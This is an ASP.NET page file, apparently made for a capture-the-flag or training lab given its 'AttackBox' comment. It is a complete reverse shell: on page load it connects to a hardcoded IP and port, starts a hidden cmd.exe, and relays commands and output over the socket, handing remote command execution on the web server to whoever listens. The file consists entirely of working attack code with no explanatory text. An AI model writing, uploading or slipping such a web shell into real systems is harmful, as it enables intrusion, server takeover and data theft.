<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    private void Page_Load(object sender, EventArgs e)
    {
        string ip = "10.10.77.155"; // Your AttackBox IP address
        int port = 45454; // The port you're listening on
        System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(ip, port);
        Stream stream = client.GetStream();
        StreamReader rdr = new StreamReader(stream);
        StreamWriter wtr = new StreamWriter(stream);
        wtr.AutoFlush = true;
        String shell = "cmd.exe";
        Process proc = new Process();
        proc.StartInfo.FileName = shell;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardInput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        StreamReader procOut = proc.StandardOutput;
        StreamWriter procIn = proc.StandardInput;
        StreamReader procErr = proc.StandardError;

        wtr.WriteLine("Connected to " + ip + ":" + port);

        while (true)
        {
            string command = rdr.ReadLine();
            if (command == null) break;
            procIn.WriteLine(command);
            procIn.Flush();
            while (!procOut.EndOfStream)
            {
                wtr.WriteLine(procOut.ReadLine());
                wtr.Flush();
            }
            while (!procErr.EndOfStream)
            {
                wtr.WriteLine(procErr.ReadLine());
                wtr.Flush();
            }
        }

        proc.Close();
    }
</script>
